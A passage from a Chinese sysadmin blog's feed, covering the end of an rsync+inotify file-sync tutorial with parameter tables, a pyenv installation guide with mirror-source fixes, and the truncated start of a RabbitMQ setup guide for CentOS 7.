inotify_rsync.sh</span></span><br></pre></td></tr></table></figure></p><h1 id="5-将同步脚本放到后台启动"><a href="#5-将同步脚本放到后台启动" class="headerlink" title="5. 将同步脚本放到后台启动"></a><strong>5. 将同步脚本放到后台启动</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nohup /data/program/rsync/inotify_rsync.sh &gt;/data/program/rsync/nohup.out 2&gt;&amp;1 &amp;</span></span><br></pre></td></tr></table></figure><h1 id="6-将同步脚本加到开机启动"><a href="#6-将同步脚本加到开机启动" class="headerlink" title="6. 将同步脚本加到开机启动"></a><strong>6. 将同步脚本加到开机启动</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"nohup /data/program/rsync/inotify_rsync.sh &gt;/data/program/rsync/nohup.out 2&gt;&amp;1 &amp;"</span> &gt;&gt; /etc/rc.local</span></span><br></pre></td></tr></table></figure><h1 id="7-rsync-inotifywait部分参数说明"><a href="#7-rsync-inotifywait部分参数说明" class="headerlink" title="7. rsync+inotifywait部分参数说明"></a><strong>7. rsync+inotifywait部分参数说明</strong></h1><h2 id="7-1-rsync参数说明"><a href="#7-1-rsync参数说明" class="headerlink" title="7.1 rsync参数说明"></a>7.1 rsync参数说明</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">-v, --verbose 详细模式输出</span><br><span class="line">-q, --quiet 精简输出模式</span><br><span class="line">-c, --checksum 打开校验开关，强制对文件传输进行校验</span><br><span class="line">-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD</span><br><span class="line">-r, --recursive 对子目录以递归模式处理</span><br><span class="line">-R, --relative 使用相对路径信息</span><br><span class="line">-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。</span><br><span class="line">--backup-dir 将备份文件(如~filename)存放在在目录下。</span><br><span class="line">-suffix=SUFFIX 定义备份文件前缀</span><br><span class="line">-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件)</span><br><span class="line">-l, --links 保留软链结</span><br><span class="line">-L, --copy-links 想对待常规文件一样处理软链结</span><br><span class="line">--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结</span><br><span class="line">--safe-links 忽略指向SRC路径目录树以外的链结</span><br><span class="line">-H, --hard-links 保留硬链结</span><br><span class="line">-p, --perms 保持文件权限</span><br><span class="line">-o, --owner 保持文件属主信息</span><br><span class="line">-g, --group 保持文件属组信息</span><br><span class="line">-D, --devices 保持设备文件信息</span><br><span class="line">-t, --times 保持文件时间信息</span><br><span class="line">-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间</span><br><span class="line">-n, --dry-run现实哪些文件将被传输</span><br><span class="line">-W, --whole-file 拷贝文件，不进行增量检测</span><br><span class="line">-x, --one-file-system 不要跨越文件系统边界</span><br><span class="line">-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节</span><br><span class="line">-e, --rsh=COMMAND 指定使用rsh、ssh方式进行数据同步</span><br><span class="line">--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息</span><br><span class="line">-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件</span><br><span class="line">--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件</span><br><span class="line">--delete 删除那些DST中SRC没有的文件</span><br><span class="line">--delete-excluded 同样删除接收端那些被该选项指定排除的文件</span><br><span class="line">--delete-after 传输结束以后再删除</span><br><span class="line">--ignore-errors 及时出现IO错误也进行删除</span><br><span class="line">--max-delete=NUM 最多删除NUM个文件</span><br><span class="line">--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输</span><br><span class="line">--force 强制删除目录，即使不为空</span><br><span class="line">--numeric-ids 不将数字的用户和组ID匹配为用户名和组名</span><br><span class="line">--timeout=TIME IP超时时间，单位为秒</span><br><span class="line">-I, --ignore-times 不跳过那些有同样的时间和长度的文件</span><br><span class="line">--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间</span><br><span class="line">--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0</span><br><span class="line">-T --temp-dir=DIR 在DIR中创建临时文件</span><br><span class="line">--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份</span><br><span class="line">-P 等同于 --partial</span><br><span class="line">--progress 显示备份过程</span><br><span class="line">-z, --compress 对备份的文件在传输时进行压缩处理</span><br><span class="line">--exclude=PATTERN 指定排除不需要传输的文件模式</span><br><span class="line">--include=PATTERN 指定不排除而需要传输的文件模式</span><br><span class="line">--exclude-from=FILE 排除FILE中指定模式的文件</span><br><span class="line">--include-from=FILE 不排除FILE指定模式匹配的文件</span><br><span class="line">--version 打印版本信息</span><br><span class="line">--address 绑定到特定的地址</span><br><span class="line">--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件</span><br><span class="line">--port=PORT 指定其他的rsync服务端口</span><br><span class="line">--blocking-io 对远程shell使用阻塞IO</span><br><span class="line">-stats 给出某些文件的传输状态</span><br><span class="line">--progress 在传输时现实传输过程</span><br><span class="line">--log-format=formAT 指定日志文件格式</span><br><span class="line">--password-file=FILE 从FILE中得到密码</span><br><span class="line">--bwlimit=KBPS 限制I/O带宽，KBytes per second</span><br><span class="line">-h, --help 显示帮助信息</span><br></pre></td></tr></table></figure><h2 id="7-2-inotifywait参数说明"><a href="#7-2-inotifywait参数说明" class="headerlink" title="7.2 inotifywait参数说明"></a>7.2 inotifywait参数说明</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-h,–help 输出帮助信息</span><br><span class="line">-m,–monitor始终保持事件监听状态，接收到一个事件而不退出，无限期地执行。默认的行为是接收到一个事件后立即退出</span><br><span class="line">-r,–recursive 递归查询目录</span><br><span class="line">-q,–quiet只打印监控事件的信息</span><br><span class="line">–exclude正则匹配需要排除的文件，区分大小写</span><br><span class="line">–excludei正则匹配需要排除的文件，不区分大小写</span><br><span class="line">-t,–timeout超时时间，如果为0，则无限期地执行下去</span><br><span class="line">–timefmt指定时间输出格式，用于–format选项中的%T格式</span><br><span class="line">–format指定输出格式</span><br><span class="line"><span class="meta">%</span><span class="bash">w 表示发生事件的目录</span></span><br><span class="line"><span class="meta">%</span><span class="bash">f 表示发生事件的文件</span></span><br><span class="line"><span class="meta">%</span><span class="bash">e 表示发生的事件</span></span><br><span class="line"><span class="meta">%</span><span class="bash">Xe 事件以“X”分隔</span></span><br><span class="line"><span class="meta">%</span><span class="bash">T 使用由–timefmt定义的时间格式</span></span><br><span class="line">-e,–event 指定监视的事件</span><br><span class="line">–fromfile 从文件读取需要监视的文件或排除的文件，一个文件一行，排除的文件以@开头</span><br><span class="line">-d, –daemon 跟–monitor一样，除了是在后台运行，需要指定–outfile把事情输出到一个文件。也意味着使用了–syslog。</span><br><span class="line">-o, –outfile  输出事情到一个文件而不是标准输出。</span><br><span class="line">-s, –syslog 输出错误信息到系统日志</span><br><span class="line">-c, –csv 输出csv格式</span><br></pre></td></tr></table></figure><h2 id="7-3-inotifywait-events事件说明"><a href="#7-3-inotifywait-events事件说明" class="headerlink" title="7.3 inotifywait events事件说明"></a>7.3 inotifywait events事件说明</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">access读取文件或目录内容</span><br><span class="line">modify修改文件或目录内容</span><br><span class="line">attrib文件或目录属性更改，如权限，时间戳等</span><br><span class="line">close_write以可写模式打开的文件被关闭，不代表此文件一定已经写入数据</span><br><span class="line">close_nowrite以只读模式打开的文件被关闭</span><br><span class="line">close文件被关闭，不管它是如何打开的</span><br><span class="line">open文件打开</span><br><span class="line">moved_to一个文件或目录移动到监听的目录，即使是在同一目录内移动，此事件也触发</span><br><span class="line">moved_from一个文件或目录移出监听的目录，即使是在同一目录内移动，此事件也触发</span><br><span class="line">move包括moved_to和 moved_from</span><br><span class="line">move_self文件或目录被移除，之后不再监听此文件或目录</span><br><span class="line">create文件或目录创建</span><br><span class="line">delete文件或目录删除</span><br><span class="line">delete_self文件或目录移除，之后不再监听此文件或目录</span><br><span class="line">unmount文件系统取消挂载，之后不再监听此文件系统</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-项目背景&quot;&gt;&lt;a href=&quot;#1-项目背景&quot; class=&quot;headerlink&quot; title=&quot;1. 项目背景&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 项目背景&lt;/strong&gt;&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;因为工作需要，需部署一套nginx负载均衡群集，群集须保证所有nginx节点配置文件完全一致；要解决不同服务器之间数据一致，一般采用NFS共享文件、DRBD镜像复制或rsync文件同步来实现，相对于rsync，前两者配置稍麻烦，此处我选择rsync文件同步来保证配置文件一致性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;rsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。但是rsync仅仅是同步工具，并不能做到监控文件变化并实时同步，因此还需要配合inotify来实现文件实时同步。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;inotify是一种强大的、细粒度的、异步的文件系统事件控制机制。linux内核从2.6.13起，加入了inotify支持，通过inotify可以监控文件系统中添加、删除、修改、移动等各种事件，利用这个内核接口，第三方软件就可以监控文件系统下文件的各种变化情况，而inotify-tools正是实施监控的软件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在这里，我们使用inotify监控文件变化，同时通过脚本来触发rsync将发生变化的文件同步到目标服务器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;术语定义：&lt;/strong&gt;&lt;br&gt;客户端–&amp;gt;源服务器（SRC）&lt;br&gt;服务端–&amp;gt;目标服务器（DEST）&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.unixmen.cn/categories/Linux/"/>
    
      <category term="Centos" scheme="http://blog.unixmen.cn/categories/Linux/Centos/"/>
    
      <category term="rsync" scheme="http://blog.unixmen.cn/categories/Linux/Centos/rsync/"/>
    
    
      <category term="rsync" scheme="http://blog.unixmen.cn/tags/rsync/"/>
    
      <category term="inotify" scheme="http://blog.unixmen.cn/tags/inotify/"/>
    
      <category term="文件同步" scheme="http://blog.unixmen.cn/tags/%E6%96%87%E4%BB%B6%E5%90%8C%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>Pyenv安装配置</title>
    <link href="http://blog.unixmen.cn/2018/05/29/pyenv%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <id>http://blog.unixmen.cn/2018/05/29/pyenv安装配置/</id>
    <published>2018-05-28T16:00:00.000Z</published>
    <updated>2018-06-11T14:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>pyenv是一个Python多版本管理工具，它可以改变全局的Python版本，安装多个版本的Python，设置目录级别的Python版本，还能创建和管理virtual python environments 。所有的设置都是用户级别的操作，不需要sudo 命令。<br>pyenv通过系统修改环境变量来实现Python不同版本的切换，它在PATH的最前面插入了一个垫片路径（shims）：~/.pyenv/shims:/usr/local/bin:/usr/bin:/bin。所有对 Python 可执行文件的查找都会首先被这个 shims 路径截获，从而使后方的系统路径失效。</p></blockquote><h1 id="1-安装pyenv"><a href="#1-安装pyenv" class="headerlink" title="1. 安装pyenv"></a><strong>1. 安装pyenv</strong></h1><h2 id="1-1-git拉取pyenv代码"><a href="#1-1-git拉取pyenv代码" class="headerlink" title="1.1 git拉取pyenv代码"></a><strong>1.1 git拉取pyenv代码</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/pyenv/pyenv.git ~/.pyenv</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="1-2-修改配置文件"><a href="#1-2-修改配置文件" class="headerlink" title="1.2 修改配置文件"></a><strong>1.2 修改配置文件</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'export PYENV_ROOT="$HOME/.pyenv"'</span> &gt;&gt; ~/.bash_profile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">'export PATH="$PYENV_ROOT/bin:$PATH"'</span> &gt;&gt; ~/.bash_profile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> -e <span class="string">'if command -v pyenv 1&gt;/dev/null 2&gt;&amp;1; then\n  eval "$(pyenv init -)"\nfi'</span> &gt;&gt; ~/.bash_profile</span></span><br></pre></td></tr></table></figure><h2 id="1-3-重新载入变量配置"><a href="#1-3-重新载入变量配置" class="headerlink" title="1.3 重新载入变量配置"></a><strong>1.3 重新载入变量配置</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure><h2 id="1-4-验证安装"><a href="#1-4-验证安装" class="headerlink" title="1.4 验证安装"></a><strong>1.4 验证安装</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pyenv versions</span></span><br></pre></td></tr></table></figure><h1 id="2-使用pyenv安装多版本Python"><a href="#2-使用pyenv安装多版本Python" class="headerlink" title="2. 使用pyenv安装多版本Python"></a><strong>2. 使用pyenv安装多版本Python</strong></h1><h2 id="2-1-安装依赖包"><a href="#2-1-安装依赖包" class="headerlink" title="2.1 安装依赖包"></a><strong>2.1 安装依赖包</strong></h2><p>在使用pyenv安装Python之前，需要安装相应的依赖包，否则在安装过程中会报错。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install -y gcc*</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install -y readline readline-devel readline-static</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install -y zlib-devel</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install -y bzip2-devel bzip2-libs</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install -y openssl openssl-devel openssl-static</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum install -y sqlite-devel</span></span><br></pre></td></tr></table></figure></p><h2 id="2-2-pyenv常用命令"><a href="#2-2-pyenv常用命令" class="headerlink" title="2.2 pyenv常用命令"></a><strong>2.2 pyenv常用命令</strong></h2><p>查看本机安装 Python 版本<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pyenv versions</span></span><br><span class="line">* 表示当前正在使用的 Python 版本</span><br></pre></td></tr></table></figure></p><p>查看可安装Python版本<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pyenv install -l</span></span><br></pre></td></tr></table></figure></p><p>python安装与卸载<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pyenv install 2.7.15   </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装python</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pyenv uninstall 2.7.15 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 卸载python</span></span><br></pre></td></tr></table></figure></p><p>python切换<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pyenv global 2.7.15  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置全局的 Python 版本，通过将版本号写入 ~/.pyenv/version 文件的方式。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pyenv <span class="built_in">local</span> 2.7.15 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置 Python 本地版本，通过将版本号写入当前目录下的 .python-version 文件的方式。通过这种方式设置的 Python 版本优先级较 global 高。</span></span><br><span class="line"></span><br><span class="line">python优先级</span><br><span class="line">shell &gt; local &gt; global</span><br><span class="line">pyenv 会从当前目录开始向上逐级查找 .python-version 文件，直到根目录为止。若找不到，就用 global 版本。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> pyenv shell 2.7.15 <span class="comment"># 设置面向 shell 的 Python 版本，通过设置当前 shell 的 PYENV_VERSION 环境变量的方式。这个版本的优先级比 local 和 global 都要高。–unset 参数可以用于取消当前 shell 设定的版本。</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pyenv shell --<span class="built_in">unset</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pyenv <span class="built_in">rehash</span>  <span class="comment"># 创建垫片路径（为所有已安装的可执行文件创建 shims，如：~/.pyenv/versions/*/bin/*，因此，每当你增删了 Python 版本或带有可执行文件的包（如 pip）以后，都应该执行一次本命令）</span></span></span><br></pre></td></tr></table></figure></p><p>查看所有pyenv支持命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pyenv commands</span></span><br></pre></td></tr></table></figure></p><h2 id="2-3-安装过程中遇到的相关问题解决"><a href="#2-3-安装过程中遇到的相关问题解决" class="headerlink" title="2.3 安装过程中遇到的相关问题解决"></a><strong>2.3 安装过程中遇到的相关问题解决</strong></h2><h3 id="2-3-1-安装Python过程慢"><a href="#2-3-1-安装Python过程慢" class="headerlink" title="2.3.1 安装Python过程慢"></a><strong>2.3.1 安装Python过程慢</strong></h3><p>pyenv安装Python过程<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv默认会从官网下载相应Python压缩包，放到/tmp目录下，然后在/tmp目录编译安装，安装在~/.pyenv/versions/下面。</span><br></pre></td></tr></table></figure></p><p>解决下载安装慢的问题<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">因为pyenv默认会从Python官网下载压缩包，因为众所周知的原因，国内访问Python官网不稳定，因此在下载过程中会非常慢，解决该问题有两个办法：</span><br><span class="line">1. 手动将Python压缩包下载到~/.pyenv/cache/目录下，pyenv会校验md5值和完整性，确认无误的话就不会重新下载直接从这里安装；这里有个需要注意的地方，需要把下载的Python压缩包后缀名由.tgz修改为.tar.gz（切记不能采用把.tgz解压之后再压缩成.tar.gz 的方式，因为这样的话会导致源文件的md5值发生变化而校验失败重新下载。）</span><br><span class="line">2. 直接修改pyenv配置文件，将Python下载地址修改为国内Python镜像源地址，在此，推荐第二种方法，我这里使用的是sohu的镜像源；修改~/.pyenv/plugins/python-build/share/python-build/目录下对应版本号文件，你需要安装哪个版本就修改哪个版本号，替换下载地址为sohu镜像源地址：</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ~/.pyenv/plugins/python-build/share/python-build/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim 3.6.5</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">install_package <span class="string">"Python-3.6.5"</span> <span class="string">"https://www.python.org/ftp/python/3.6.5/Python-3.6.5.tar.xz#f434053ba1b5c8a5cc597e966ead3c5143012af827fd3f0697d21450bb8d87a6</span></span></span><br><span class="line">  install_package "Python-3.6.5" "http://mirrors.sohu.com/python/3.6.5/Python-3.6.5.tar.xz#f434053ba1b5c8a5cc597e966ead3c5143012af827fd3f0697d21450bb8d87a6</span><br></pre></td></tr></table></figure></p><h3 id="2-3-2-pip安装库timeout"><a href="#2-3-2-pip安装库timeout" class="headerlink" title="2.3.2 pip安装库timeout"></a><strong>2.3.2 pip安装库timeout</strong></h3><p>pip安装库的时候，也会经常出现现在速度很慢或者timeout的状况，更换成国内镜像源即可解决问题<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">创建一个pip.conf文件</span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir ~/.pip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim ~/.pip/pip.conf</span></span><br><span class="line">[global]</span><br><span class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"></span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;pyenv是一个Python多版本管理工具，它可以改变全局的Python版本，安装多个版本的Python，设置目录级别的Python版本，还能创建和管理virtual python environments 。所有的设置都是用户级别的操作，不需要sudo 命令。&lt;br&gt;pyenv通过系统修改环境变量来实现Python不同版本的切换，它在PATH的最前面插入了一个垫片路径（shims）：~/.pyenv/shims:/usr/local/bin:/usr/bin:/bin。所有对 Python 可执行文件的查找都会首先被这个 shims 路径截获，从而使后方的系统路径失效。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-安装pyenv&quot;&gt;&lt;a href=&quot;#1-安装pyenv&quot; class=&quot;headerlink&quot; title=&quot;1. 安装pyenv&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 安装pyenv&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;1-1-git拉取pyenv代码&quot;&gt;&lt;a href=&quot;#1-1-git拉取pyenv代码&quot; class=&quot;headerlink&quot; title=&quot;1.1 git拉取pyenv代码&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.1 git拉取pyenv代码&lt;/strong&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/pyenv/pyenv.git ~/.pyenv&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.unixmen.cn/categories/Linux/"/>
    
      <category term="Python" scheme="http://blog.unixmen.cn/categories/Linux/Python/"/>
    
    
      <category term="Python" scheme="http://blog.unixmen.cn/tags/Python/"/>
    
      <category term="pyenv" scheme="http://blog.unixmen.cn/tags/pyenv/"/>
    
  </entry>
  
  <entry>
    <title>Centos7安装配置RabbitMQ</title>
    <link href="http://blog.unixmen.cn/2018/05/07/Centos7%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AERabbitMQ/"/>
    <id>http://blog.unixmen.cn/2018/05/07/Centos7安装配置RabbitMQ/</id>
    <published>2018-05-06T16:00:00.000Z</published>
    <updated>2018-06-11T14:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-RabbitMQ介绍"><a href="#1-RabbitMQ介绍" class="headerlink" title="1. RabbitMQ介绍"></a><strong>1. RabbitMQ介绍</strong></h1><blockquote><p>RabbitMQ是实现AMQP（高级消息队列协议）的消息中间件的一种，最初起源于金融系统，用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。RabbitMQ主要是为了实现系统之间的双向解耦而实现的。当生产者大量产生数据时，消费者无法快速消费，那么需要一个中间层。保存这个数据。</p></blockquote><blockquote><p>AMQP，即Advanced Message Queuing Protocol，高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。消息中间件主要用于组件之间的解耦，消息的发送者无需知道消息使用者的存在，反之亦然。AMQP的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。</p></blockquote><blockquote><p>RabbitMQ是一个开源的AMQP实现，服务器端用Erlang语言编写，支持多种客户端，如：Python、Ruby、.NET、Java、JMS、C、PHP、ActionScript、XMPP、STOMP等，支持AJAX。用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。</p></blockquote><blockquote><pre><code>---以上内容我抄的</code></pre></blockquote><a id="more"></a><h1 id="2-准备所需软件包"><a href="#2-准备所需软件包" class="headerlink" title="2. 准备所需软件包"></a><strong>2. 准备所需软件包</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> ls /data/src/</span><br><span class="line">jdk-8u171-linux-x64.rpm  otp_src_18.3.tar.gz  rabbitmq-server-generic-unix-3.6.6.tar   wxWidgets-3.0.4.tar</span><br></pre></td></tr></table></figure><h1 id="3-编译安装Erlang"><a href="#3-编译安装Erlang" class="headerlink" title="3. 编译安装Erlang "></a><strong>3. 编译安装Erlang</strong> </h1><p>因为RabbitMQ是用Erlang语言编写的，所以在编译安装RabbitMQ之前必须要先编译安装Erlang，Erlang的安装可以使用yum安装，也可以使用源码包编译安装；Centos7上yum安装的Erlang版本太低，因此，此处我们采用源码包编译安装。</p><h2 id="3-1-安装依赖环境"><a href="#3-1-安装依赖环境" class="headerlink" title="3.1 安装依赖环境"></a><strong>3.1 安装依赖环境</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> yum install -y gcc*</span><br><span class="line"><span class="meta">#</span> yum install -y ncurses-devel</span><br><span class="line"><span class="meta">#</span> yum install -y unixODBC unixODBC-devel</span><br><span class="line"><span class="meta">#</span> yum install -y openssl-devel</span><br><span class="line"><span class="meta">#</span> yum install -y mesa* freeglut*</span><br><span class="line"><span class="meta">#</span> yum install -y fop</span><br><span 